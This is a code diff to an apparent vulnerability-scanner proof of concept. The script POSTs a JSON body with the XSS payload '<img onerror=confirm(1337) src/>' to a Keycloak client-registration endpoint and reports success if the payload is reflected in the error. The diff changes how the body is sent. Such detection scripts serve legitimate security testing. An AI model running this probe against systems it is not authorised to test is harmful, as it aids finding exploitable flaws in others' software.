@@ -37,9 +37,9 @@ def poc(url):
 
         path = """/auth/realms/master/clients-registrations/openid-connect"""
         method = "POST"
-        data = """{"<img onerror=confirm(1337) src/>":1}"""
+        data = {"<img onerror=confirm(1337) src/>":1}
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if (resp0.status_code == 400) and ("""Unrecognized field "<img onerror=confirm(1337) src/>""" in resp0.text):
             result["success"] = True
